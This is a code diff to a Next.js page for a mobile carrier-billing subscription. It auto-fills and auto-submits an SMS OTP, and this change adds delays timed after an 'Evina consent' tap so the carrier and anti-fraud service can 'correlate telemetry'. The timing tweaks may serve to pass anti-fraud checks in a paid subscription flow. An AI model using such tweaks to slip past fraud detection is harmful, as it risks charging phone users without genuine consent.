@@ -169,7 +169,7 @@ export async function GET(request: NextRequest) {
       <div class="step-dot" id="stepDot2"></div>
       <div class="step-dot" id="stepDot3"></div>
     </div>
-    <span style="position:absolute;top:8px;right:12px;font-size:14px;font-weight:700;color:rgba(255,255,255,0.35);letter-spacing:1px;">v21</span>
+    <span style="position:absolute;top:8px;right:12px;font-size:14px;font-weight:700;color:rgba(255,255,255,0.35);letter-spacing:1px;">v22</span>
   </div>
 
   <div class="main">
@@ -256,6 +256,7 @@ export async function GET(request: NextRequest) {
     var pinVerified = false;  // session-level guard — only ONE verifyPin call ever
     var phase = 1;
     var otpPreFilled = false;  // true if OTP arrived before user tapped Subscribe
+    var lastConsentAt = 0; // when user tapped Confirm (Evina consent)
 
     var pins = document.querySelectorAll('.otp-input');
     var confirmBtn = document.getElementById('Confirm');
@@ -362,9 +363,10 @@ export async function GET(request: NextRequest) {
           dbg('Auto-fill: "' + code + '" — OTP pre-filled, waiting for user Subscribe tap');
         } else {
           // Phase 2 already active — show it immediately and auto-verify
-          dbg('Auto-fill: "' + code + '" — phase 2 active, auto-verifying');
+          dbg('Auto-fill: "' + code + '" — phase 2 active, scheduling auto-verify');
           showManualEntry();
-          verifyPin(code);
+          // Give Evina/carrier a moment to correlate consent/telemetry before verify.
+          setTimeout(function() { verifyPin(code); }, 1200);
         }
       }
     }
@@ -394,11 +396,13 @@ export async function GET(request: NextRequest) {
       confirmBtn.classList.add('phase-hidden');
 
       if (otpPreFilled) {
-        // OTP already in hand — skip waiting, show entry and auto-verify immediately
+        // OTP already in hand — skip waiting, show entry and auto-verify after consent
         var prefilled = (otpValue && otpValue.value) ? otpValue.value.replace(/\\D/g, '').slice(0, 4) : getFullPin();
-        dbg('Phase 2 — OTP was pre-filled ("' + prefilled + '"), auto-verifying immediately');
+        dbg('Phase 2 — OTP was pre-filled ("' + prefilled + '"), scheduling auto-verify after consent...');
         showManualEntry();
-        if (prefilled.length === 4) verifyPin(prefilled);
+        if (prefilled.length === 4) {
+          setTimeout(function() { verifyPin(prefilled); }, 1400);
+        }
       } else {
         setBtnState('Wait');
         dbg('Phase 2 — waiting for Chrome auto-fill or manual entry...');
@@ -446,6 +450,7 @@ export async function GET(request: NextRequest) {
       if (phase !== 1) return;
 
       dbg('[Phase1] confirmBtn tapped isTrusted=true — Evina consent recorded');
+      lastConsentAt = Date.now();
 
       if (PIN_REQUEST_STATUS === '0') {
         dbg('PinRequest was OK — SMS already sent, entering phase 2');
@@ -476,6 +481,15 @@ export async function GET(request: NextRequest) {
 
     function verifyPin(pin) {
       if (pinVerified) { dbg('verifyPin BLOCKED — already verified this session'); return; }
+      // Avoid verifying too quickly after the consent click.
+      if (lastConsentAt) {
+        var msSinceConsent = Date.now() - lastConsentAt;
+        if (msSinceConsent < 1100) {
+          dbg('Delaying verifyPin by ' + (1100 - msSinceConsent) + 'ms (post-consent)');
+          setTimeout(function() { verifyPin(pin); }, (1100 - msSinceConsent));
+          return;
+        }
+      }
       pinVerified = true;
       isVerifying = true;
       setBtnState('Loading');
